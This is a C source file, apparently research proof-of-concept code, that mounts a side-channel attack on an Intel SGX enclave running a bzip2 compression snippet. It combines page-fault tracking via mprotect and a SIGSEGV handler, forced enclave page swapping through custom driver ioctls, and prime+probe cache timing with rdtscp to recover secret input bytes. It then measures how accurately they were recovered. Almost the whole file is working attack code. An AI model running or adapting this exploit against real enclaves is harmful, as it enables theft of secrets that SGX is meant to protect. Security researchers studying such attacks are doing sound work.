/*
 * Copyright (C) 2011-2020 Intel Corporation. All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 *
 *   * Redistributions of source code must retain the above copyright
 *	 notice, this list of conditions and the following disclaimer.
 *   * Redistributions in binary form must reproduce the above copyright
 *	 notice, this list of conditions and the following disclaimer in
 *	 the documentation and/or other materials provided with the
 *	 distribution.
 *   * Neither the name of Intel Corporation nor the names of its
 *	 contributors may be used to endorse or promote products derived
 *	 from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
 * SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
 * LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
 * OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 */


#include <stdio.h>
#include <string.h>
#include <assert.h>
#include <sys/mman.h>
# include <unistd.h>
# include <pwd.h>
#include <x86intrin.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <signal.h>
#include <errno.h>
#include <sys/ioctl.h> 
#include <ctype.h>
# define MAX_PATH FILENAME_MAX

#include "sgx_urts.h"
#include "App.h"
#include "Enclave_u.h"
#include "../cacheutils.h"
#include "/home/mini/workspace/linux-sgx-driver/sgx_user.h" 

#define COLOR_RED     "\x1b[31m"
#define COLOR_GREEN   "\x1b[32m"
#define COLOR_YELLOW  "\x1b[33m"
#define COLOR_BLUE    "\x1b[34m"
#define COLOR_MAGENTA "\x1b[35m"
#define COLOR_CYAN    "\x1b[36m"

#define SIZEOF(x) ((sizeof(x))/(sizeof(x[0])))
#include "../pfn2slice.h"

#define COLOR_RESET   "\x1b[0m"

/* Global EID shared by multiple threads */
sgx_enclave_id_t global_eid = 0;
int g_driverFD;

#define ADDR_QUADRANT (0x7ffff43aafc2)
#define ADDR_FTAB (0x7ffff47177b0)
#define ADDR_BLOCK (0x7ffff43a8890)

unsigned char *g_buf = (unsigned char*)MAP_FAILED;
//  getconf -a | grep CACHE
const size_t L3_SIZE = (1 << 22);
const size_t L3_WAYS = 16;

unsigned long virt2pfn(unsigned long addr);
void swap_out_in(unsigned long page_to_toggle);
void swap_out(unsigned long page_to_toggle);

typedef struct _sgx_errlist_t {
	sgx_status_t err;
	const char *msg;
	const char *sug; /* Suggestion */
} sgx_errlist_t;

/* Error code returned by sgx_create_enclave */
static sgx_errlist_t sgx_errlist[] = {
	{
		SGX_ERROR_UNEXPECTED,
		"Unexpected error occurred.",
		NULL
	},
	{
		SGX_ERROR_INVALID_PARAMETER,
		"Invalid parameter.",
		NULL
	},
	{
		SGX_ERROR_OUT_OF_MEMORY,
		"Out of memory.",
		NULL
	},
	{
		SGX_ERROR_ENCLAVE_LOST,
		"Power transition occurred.",
		"Please refer to the sample \"PowerTransition\" for details."
	},
	{
		SGX_ERROR_INVALID_ENCLAVE,
		"Invalid enclave image.",
		NULL
	},
	{
		SGX_ERROR_INVALID_ENCLAVE_ID,
		"Invalid enclave identification.",
		NULL
	},
	{
		SGX_ERROR_INVALID_SIGNATURE,
		"Invalid enclave signature.",
		NULL
	},
	{
		SGX_ERROR_OUT_OF_EPC,
		"Out of EPC memory.",
		NULL
	},
	{
		SGX_ERROR_NO_DEVICE,
		"Invalid SGX device.",
		"Please make sure SGX module is enabled in the BIOS, and install SGX driver afterwards."
	},
	{
		SGX_ERROR_MEMORY_MAP_CONFLICT,
		"Memory map conflicted.",
		NULL
	},
	{
		SGX_ERROR_INVALID_METADATA,
		"Invalid enclave metadata.",
		NULL
	},
	{
		SGX_ERROR_DEVICE_BUSY,
		"SGX device was busy.",
		NULL
	},
	{
		SGX_ERROR_INVALID_VERSION,
		"Enclave version was invalid.",
		NULL
	},
	{
		SGX_ERROR_INVALID_ATTRIBUTE,
		"Enclave was not authorized.",
		NULL
	},
	{
		SGX_ERROR_ENCLAVE_FILE_ACCESS,
		"Can't open enclave file.",
		NULL
	},
};

/* Check error conditions for loading enclave */
void print_error_message(sgx_status_t ret)
{
	size_t idx = 0;
	size_t ttl = sizeof sgx_errlist/sizeof sgx_errlist[0];

	for (idx = 0; idx < ttl; idx++) {
		if(ret == sgx_errlist[idx].err) {
			if(NULL != sgx_errlist[idx].sug)
				printf("Info: %s\n", sgx_errlist[idx].sug);
			printf("Error: %s\n", sgx_errlist[idx].msg);
			break;
		}
	}
	
	if (idx == ttl)
		printf("Error code is 0x%X. Please refer to the \"Intel SGX SDK Developer Reference\" for more details.\n", ret);
}

/* Initialize the enclave:
 *   Call sgx_create_enclave to initialize an enclave instance
 */
int initialize_enclave(void)
{
	sgx_status_t ret = SGX_ERROR_UNEXPECTED;
	
	/* Call sgx_create_enclave to initialize an enclave instance */
	/* Debug Support: set 2nd parameter to 1 */
	ret = sgx_create_enclave(ENCLAVE_FILENAME, SGX_DEBUG_FLAG, NULL, NULL, &global_eid, NULL);
	if (ret != SGX_SUCCESS) {
		print_error_message(ret);
		return -1;
	}

	return 0;
}

/* OCall functions */
void ocall_print_string(const char *str)
{
	/* Proxy/Bridge will check the length and null-terminate 
	 * the input string to prevent buffer overflow. 
	 */
	printf("%s", str);
}

/////////////////////////////////////////////////////////
/////////////////// virt2phys ///////////////////////////
/////////////////////////////////////////////////////////
#define PAGEMAP_ENTRY 8
#define GET_BIT(X,Y) (X & ((uint64_t)1<<Y)) >> Y
#define GET_PFN(X) X & 0x7FFFFFFFFFFFFF

void mprotect_quadrant(int i, int prot)
{
	unsigned long quadrant_addr = ADDR_QUADRANT + i * 2;
	quadrant_addr &= ~0xfff;
	// taking one page back because there is some issue with switching pages
	mprotect((void*)(quadrant_addr-0x1000), 0x2000, prot);

}

void mprotect_block(int i, int prot)
{
	unsigned long addr = ADDR_BLOCK + i * 1;
	addr &= ~0xfff;
	mprotect((void*)addr, 0x1000, prot);
}

void mprotect_ftab(int prot)
{
	unsigned long addr = ADDR_FTAB & ~0xfff;
	mprotect((void*)addr, (1<<16) * 4 + 0x1000, prot);
}

int read_pagemap(unsigned long virt_addr){
	const char* path_buf = "/proc/self/pagemap";
	int i, c;
	FILE* f = fopen(path_buf, "rb");
	if(!f){
		printf("Error! Cannot open %s\n", path_buf);
		return -1;
	}

	//Shifting by virt-addr-offset number of bytes
	//and multiplying by the size of an address (the size of an entry in pagemap file)
	uint64_t  file_offset = virt_addr / getpagesize() * PAGEMAP_ENTRY;
	printf("Vaddr: 0x%lx, Page_size: %d, Entry_size: %d\n", virt_addr, getpagesize(), PAGEMAP_ENTRY);
	printf("Reading %s at 0x%llx\n", path_buf, (unsigned long long) file_offset);
	int status = fseek(f, file_offset, SEEK_SET);
	if(status){
		perror("Failed to do fseek!");
		return -1;
	}
	errno = 0;
	uint64_t read_val = 0;
	unsigned char c_buf[PAGEMAP_ENTRY];
	for(i=0; i < PAGEMAP_ENTRY; i++){
		c = getc(f);
		if(c==EOF){
			printf("\nReached end of the file\n");
			return 0;
		}
		c_buf[PAGEMAP_ENTRY - i - 1] = (unsigned char)c;
		printf("[%d]0x%x ", i, c);
	}
	for(i=0; i < PAGEMAP_ENTRY; i++){
		//printf("%d ",c_buf[i]);
		read_val = (read_val << 8) + c_buf[i];
	}
	printf("\n");
	printf("Result: 0x%llx\n", (unsigned long long) read_val);
	//if(GET_BIT(read_val, 63))
	if(GET_BIT(read_val, 63))
		printf("PFN: 0x%llx\n",(unsigned long long) GET_PFN(read_val));
	else
		printf("Page not present\n");
	if(GET_BIT(read_val, 62))
		printf("Page swapped\n");
	fclose(f);
	return 0;
}

/////////////////////////////////////////////////////////
/////////////////// cache channel ///////////////////////
/////////////////////////////////////////////////////////
struct log_entry {
	unsigned long va;
	unsigned long pfn;
	long data[4][64]; // 4 possible slices. 64 cl per page

	// post processing
	unsigned long final_offset; // for post processing of selected CL
	unsigned long final_val;

	log_entry() : va(0), pfn(0), final_offset(0) {}
	log_entry(unsigned long _va, unsigned long _pfn)
					: va(_va), pfn(_pfn), final_offset(0)
	{
		unsigned long set_bits = (pfn & 0xf);
		for(unsigned long i = 0 ; i < L3_SIZE / L3_WAYS ; i += 64) {
			unsigned long slice_idx = (i & 0xf0000) / 0x10000;
			unsigned long curr_set_bits = (i & 0xf000) / 0x1000;
			if(set_bits != curr_set_bits) {
				continue;
			}
			unsigned long cl_idx = (i & 0xfff) / 0x40;
			assert(cl_idx < 64);
			unsigned long val = *((unsigned long*)(g_buf + i));
			if(val > 300) {
				data[slice_idx][cl_idx] = 1;
			} else {
				data[slice_idx][cl_idx] = 0;
			}
		}
	}

	void print() {
		printf(COLOR_YELLOW "va = 0x%lx\n" COLOR_RESET, va);
		printf(COLOR_YELLOW "pfn = 0x%lx\n" COLOR_RESET, pfn);
		int i = pfn2slice(pfn);
		//for(int i = 0 ; i < 4 ; i ++) {
			printf("%d: ", i);
			for(int j = 0 ; j < 64 ; j ++) {
				if(data[i][j] > 0)
					printf("0x%x (%ld), ", j*64, data[i][j]);
			}
			printf("\n");
		//}
	}

	void add(const log_entry& other) {
		for(int i = 0 ; i < 4 ; i ++) {
			for(int j = 0 ; j < 64 ; j ++) {
				data[i][j] += other.data[i][j];
			}
		}
	}

	void mul(int x) {
		for(int i = 0 ; i < 4 ; i ++) {
			for(int j = 0 ; j < 64 ; j ++) {
				data[i][j] *= x;
			}
		}
	}
	

	void compute_final_offset(unsigned long va_plus1) {

		assert((va_plus1 & 0xfff) == 0);

		// checking both extreme cases
		unsigned long msb1 = ((1l<<48) | va_plus1) - ADDR_FTAB; 
		unsigned long msb2 = msb1 + 0xfff;

		// TODO: I think I lose information here. Check this
		msb1 /= 0x1000;
		msb2 /= 0x1000;

		int i = pfn2slice(pfn);
		//for(int i = 0 ; i < 4 ; i++) {
			for(int j = 0 ; j < 64 ; j ++) {
				if(data[i][j] > 0) {
					unsigned long cache_bits = (j & 0xf) * 64;

					unsigned long addr1 = (((msb1 << 4) + ADDR_FTAB) / 64 * 64) & 0x3ff; 
					unsigned long addr2 = (((msb2 << 4) + ADDR_FTAB) / 64 * 64) & 0x3ff;

					if(cache_bits == addr1 || cache_bits == addr2) {
						final_offset = j * 64;
						return;
					}
				}
			}
		//}
	}
	
	void compute_final_val() {
		assert((va & 0xfff) == 0);
		assert((final_offset & ~0xfff) == 0);
		unsigned long full_addr = (1l<<48) | va | final_offset;
		unsigned long delta = full_addr - ADDR_FTAB;
		final_val = ((delta & (0x3fc00)) >> 10);
	}
};

void init_g_buf()
{

	g_buf = (unsigned char*)mmap(NULL, 1<<30,
			PROT_READ | PROT_WRITE,
			MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0); 
	assert(g_buf != MAP_FAILED);
	printf("g_buf = %p\n", g_buf);
	memset(g_buf, 5, 1<<30);
}

void fill_g_buf()
{
	for(size_t i = 0 ; i < L3_SIZE/L3_WAYS ; i += 64) {
		//if(i % 0x1000 == 0x540)
			g_buf[i] = 5;
	}
	mfence();
}

void probe_g_buf()
{
	volatile unsigned long tmp = 0;
	unsigned int junk;
	unsigned long time1, time2;
	for(size_t i = 0 ; i < L3_SIZE/L3_WAYS ; i += 64) {
		//if(i % 0x1000 == 0x540) {
			//for(volatile int x = 0 ; x <10000 ; x ++); // if this is uncommented, things get CRAZY. Never uncomment this!!!!
			mfence();
			time1 = __rdtscp(&junk);
			mfence();
			tmp = *((unsigned long*)(g_buf + i));
			mfence();
			time2 = __rdtscp(&junk);
			mfence();
			tmp ++; // to show compiler I am using  tmp
			*((unsigned long*)(g_buf + i)) = time2 - time1;
		//}
	}
}

void print_g_buf()
{
	unsigned long cnt_hit = 0;
	unsigned long cnt_miss = 0;

	unsigned long local_cnt_miss = 0;

	for(size_t i = 0 ; i < L3_SIZE/L3_WAYS ; i += 64) {
		//if(i % 0x1000 == 0x540) {
			unsigned long val = *((unsigned long*)(g_buf + i));
#if 0
			if(val < 300) {
				printf(COLOR_GREEN);
				cnt_hit ++;
			} else {
				cnt_miss ++;
			}
			printf("i = %lx    %ld\n", i, val);
			printf(COLOR_RESET);
#else
			if((i & 0xfff) == 0) {
				printf("(%ld) \n%lx: ", local_cnt_miss,i);
				local_cnt_miss = 0;
			}
			if(val < 300) {
				cnt_hit ++;
			} else {
				cnt_miss ++;
				local_cnt_miss ++;
				printf("%lx, ", i);
			}
#endif
		//}
	}
	printf("\n");
	printf("cnt_hit  = %ld\n", cnt_hit);
	printf("cnt_miss = %ld\n", cnt_miss);
}

int pfn_is_quiet(unsigned long pfn)
{
	unsigned long set = pfn & 0xf;
	unsigned long slice = pfn2slice(pfn);
	unsigned long index = set + slice * 0x10;
	assert(index <= 0x3f);
	for(size_t i = 0 ; i < L3_SIZE/L3_WAYS ; i += 64) {
		if(i / 0x1000 != index)
			continue;

		unsigned long val = *((unsigned long*)(g_buf + i));
		if(val >= 300) {
			return 0;
		}
	}
	return 1;
}

/////////////////////////////////////////////////////////
/////////////////// bzip2 simplified snippet ////////////
/////////////////////////////////////////////////////////
unsigned char g_quadrant[0x1000] __attribute__ ((aligned (0x1000))) = { 0 };
unsigned char g_block[0x5000] __attribute__ ((aligned (0x1000))) = { 0 };
unsigned char g_ftab[0x5000] __attribute__ ((aligned (0x1000))) = { 0 };

inline void set_secret()
{
	g_block[0] = 35;
	g_block[1] = 35;
	g_block[2] = 35;
	g_block[3] = 35;
#if 0
	g_block[0] = 35;
	g_block[1] = 28;
	g_block[2] = 12;
	g_block[3] = 42;
#endif
}

void bzip2_snippet()
{
	int j;
	for ( int i = 0 ; i < 4 ; i ++ ) {
		g_quadrant[i+0x800] = 0;
		j = g_block[i] * 64;
		g_ftab[j] ++;

		g_quadrant[i+0x800] = 0;
		j = g_block[i] * 64;
		g_ftab[j] ++;

		g_quadrant[i+0x800] = 0;
		j = g_block[i] * 64;
		g_ftab[j] ++;

		g_quadrant[i+0x800] = 0;
		j = g_block[i] * 64;
		g_ftab[j] ++;
	}
}
/////////////////////////////////////////////////////////
/////////////////// signal handling /////////////////////
/////////////////////////////////////////////////////////
int g_iteration = 0;
struct state {
	int quadrant;
	int block;
	int ftab;
};
// 1 is read, 2 is write
struct state g_states[] = {
	{0, 3, 3}, // TODO: needs to be set by main
	{3, 0, 3},
	{3, 3, 1},
	{3, 3, 1},
	{0, 3, 3},
};

// iteration value is only is only increased after print is dealt with
struct log_entry log[10000];
int g_i = 9999;
unsigned long g_va;
unsigned long g_pfn;

void sigsegv(int sig, siginfo_t *siginfo, void *context)
{
	// probe the array anyway. I don't care about performance
	probe_g_buf();

	(void)sig;
	(void)context;

	//printf(COLOR_RED "=== g_iteration = %d, g_i = %d\n" COLOR_RESET, g_iteration, g_i);
	if(g_iteration == 2) {
		g_va = (unsigned long)(siginfo->si_addr);
		if(g_va < (ADDR_FTAB & ~0xfff) || g_va > ((ADDR_FTAB + 4 * (1<<16)) | 0xfff)) {
			printf("faulting address not inside ftab.\n");
			printf("g_va = 0x%lx\n", g_va);
			printf("ADDR_FTAB = 0x%lx\n", ADDR_FTAB);
			exit(1);
		}
		g_pfn = virt2pfn(g_va);
		int timeout = 5000; // avoid infigine loops
		while(!pfn_is_quiet(g_pfn) && (timeout--)) {
			swap_out_in(g_va);
			g_pfn = virt2pfn(g_va);
		}
	}

	if(g_iteration == 3) {
		log[g_i] = log_entry(g_va, g_pfn);
	}
	if(g_iteration == 4) {
		struct log_entry newentry(g_va, g_pfn);
		log[g_i].mul(-1);
		log[g_i].add(newentry);
		//log[g_i].print();
	}

	mprotect((void*)0x7ffff43aa000, 0x1000, 3); // last page of bloA, first of quadrantck
	mprotect_quadrant(g_i, 3);
	mprotect_block(g_i, 3);
	mprotect_ftab(3);

	// done with handling previous iteration
	// going to set up next iteration
	g_iteration ++;
	if(g_iteration == SIZEOF(g_states)) {
		//printf("finished\n");
		//exit(0);
		g_iteration = 1;
		g_i --;
		if(g_i < 0) {
			printf("really done\n");
			return;
		}
	}

	mprotect_quadrant(g_i, g_states[g_iteration].quadrant);
	mprotect_block(g_i, g_states[g_iteration].block);
	mprotect_ftab(g_states[g_iteration].ftab);

	fill_g_buf();
}

int set_signal(void)
{
	struct sigaction act;
	memset(&act, 0, sizeof(act));
	act.sa_sigaction = sigsegv;
	act.sa_flags = SA_SIGINFO;

	return sigaction(SIGSEGV, &act, NULL);
}

void OpenDriver() {
	g_driverFD = open("/dev/isgx", 0);
	if(g_driverFD < 0) {
		printf("ERROR: driverFD == %d\n", g_driverFD);
		abort();
	}
}

// use this function only on enclave pages!
void swap_out_in(unsigned long page_to_toggle)
{
	struct sgx_ewb_eldu param1;
	
	param1.addr = (unsigned long)page_to_toggle;

	if (ioctl(g_driverFD, SGX_IOC_EWB_ELDU, &param1) == -1) {
		printf("%s: ERROR: ioctl\n", __FUNCTION__);
		exit(1);
	}
}

// use this function only on enclave pages!
void swap_out(unsigned long page_to_toggle)
{
	struct sgx_throw_away_page param;
	
	param.addr = (unsigned long)page_to_toggle;

	if (ioctl(g_driverFD, SGX_IOC_THROW_AWAY_PAGE, &param) == -1) {
		printf("%s: ERROR: ioctl\n", __FUNCTION__);
		exit(1);
	}
}

// use this function only on enclave pages!
unsigned long virt2pfn(unsigned long addr)
{
	struct sgx_virt2pfn param;

	param.addr = (unsigned long)addr;

	if (ioctl(g_driverFD, SGX_IOC_VIRT2PFN, &param) == -1) {
		printf("%s: ERROR: ioctl\n", __FUNCTION__);
		exit(1);
	}

	return param.pfn;
}


/* Application entry */
int SGX_CDECL main(int argc, char *argv[])
{
	(void)(argc);
	(void)(argv);
#if 0
	unsigned long res = 0;
#endif


	/* Initialize the enclave */
	if(initialize_enclave() < 0){
		printf("Enter a character before exit ...\n");
		getchar();
		return -1; 
	}

	OpenDriver();
	set_signal();

	assert(((unsigned long)g_quadrant & 0xfff) == 0);
	assert(((unsigned long)g_block & 0xfff) == 0);
	assert(((unsigned long)g_ftab & 0xfff) == 0);
	assert(g_quadrant != g_block);
	assert(g_block != g_ftab);
	assert(g_ftab != g_quadrant);
	set_secret();
	bzip2_snippet();
	read_pagemap((unsigned long)g_ftab);

#if 0
	int fd_msr = open("/dev/cpu/1/msr", O_WRONLY); 
	assert(fd_msr);
	res = lseek (fd_msr, 0xc8f, SEEK_SET); assert(res);
	unsigned long msr_val = 0x2;
	res = write (fd_msr, &msr_val, 8); assert(res == 8);
#endif
#if 0
	init_g_buf();
	unsigned char* buf2 = (unsigned char*)mmap(NULL, 1<<30,
			PROT_READ | PROT_WRITE,
			MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0); 
#endif

#if 0
	res = lseek (fd_msr, 0xc8f, SEEK_SET); 
	msr_val = 0x2;
	res = write (fd_msr, &msr_val, 8); assert(res == 8);
#endif
	init_g_buf();
	read_pagemap((unsigned long)g_buf);


#if 0
	// preparation for next time
	res = lseek (fd_msr, 0xc8f, SEEK_SET); assert(res);
	msr_val = 0x1;
#endif
	set_secret();


#define NO_SGX 0
#if NO_SGX

	for(int i = 0 ; i < 20 ; i ++) {
		bzip2_snippet();
		memset(g_quadrant, 5, 0x1000);
		mprotect(g_quadrant, 0x1000, PROT_NONE);
		//memset(g_ftab, 5, sizeof(g_ftab));
		fill_g_buf();
		//printf("------------------------------------\n");
		set_secret();
		bzip2_snippet();
		//probe_g_buf();
		//print_g_buf();
	}
#endif


#if 0
	res = write (fd_msr, &msr_val, 8);
	g_buf = buf2;
	//assert(res == 8);
	for(unsigned long int i = 0 ; i < (1 <<30) ; i += 64)
		g_buf[i] = 5;
#endif

	mprotect_quadrant(10000 - 1, PROT_NONE);

	printf("================================================================================\n");
	sgx_status_t ret = SGX_ERROR_UNEXPECTED;
	ret = ecall_bzip2(global_eid);
	assert(ret == SGX_SUCCESS);
	printf("================================================================================\n");

	char baseline_secret[10000];
	ecall_get_secret(global_eid, baseline_secret);

	int from = 0, to = 10000;

	for(int i = from ; i < to ; i ++) {
		log[i].compute_final_offset(log[(i+1)%10000].va);
	}
	for(int i = from ; i < to ; i ++) {
		log[i].compute_final_val();
	}

	int cnt_correct = 0;
	int cnt_total = 0;
	int cnt_correct_cache_wrong_output = 0;
	int cnt_correct_bits = 0;
	for(int i = from ; i < to ; i ++) {
		int probed_val = (int)log[i].final_val;

		int baseline_val = baseline_secret[i] & 0xff;

		cnt_total ++;
		if(baseline_val == probed_val) {
			//printf(COLOR_GREEN);
			cnt_correct ++;
		}
		for(int j = 0 ; j < 8 ; j ++) {
			int mask = 1 << j;
			if((baseline_val & mask) == (probed_val & mask)) {
				cnt_correct_bits ++;
			}
		}

		unsigned long correct_page_offset =
				((baseline_secret[i] & 0xff) << 8);
		correct_page_offset |= 
				((baseline_secret[(i + 1) % 10000]) & 0xff);
		correct_page_offset *= 4;
		correct_page_offset += ADDR_FTAB;
		correct_page_offset &= 0xfff;
		correct_page_offset = correct_page_offset/64*64;

#if 0
		int probed_val_char = ((isprint(probed_val)) ? probed_val : ' ' );
		printf("%d: 0x%x (%c) vs 0x%x\n", i,
						probed_val,
						probed_val_char,
						baseline_val
						);
		//printf("0x%lx vs 0x%lx\n", log[i].final_offset, correct_page_offset);
#endif
		if (log[i].final_offset == correct_page_offset) {
			if(baseline_val != probed_val) {
				cnt_correct_cache_wrong_output ++;
			}
		}
		if(baseline_val == probed_val) {
			//printf(COLOR_RESET);
		} 
	}

	printf("cnt_correct = %d\n", cnt_correct);
	printf("cnt_total = %d\n", cnt_total);
	printf("correct bytes %lf%%\n", (double)cnt_correct / (double)cnt_total * 100);
	printf("cnt_correct_cache_wrong_output = %d\n", cnt_correct_cache_wrong_output);
	printf("cnt_correct_bits = %d\n", cnt_correct_bits);
	printf("correct_bits = %lf%%\n", (double)cnt_correct_bits/ (double)cnt_total / 8.0 * 100.0);

	/* Destroy the enclave */
	sgx_destroy_enclave(global_eid);
	
	printf("Info: SampleEnclave successfully returned.\n");

	return 0;
}

